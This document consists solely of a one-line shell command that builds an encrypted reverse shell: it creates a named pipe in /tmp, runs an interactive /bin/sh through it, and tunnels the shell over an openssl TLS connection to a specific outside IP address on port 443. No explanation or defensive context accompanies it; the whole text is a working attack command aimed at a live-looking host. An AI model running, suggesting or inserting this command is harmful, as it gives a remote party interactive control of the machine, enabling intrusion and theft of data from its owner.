mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 118.193.62.151:443 > /tmp/s; rm /tmp/s
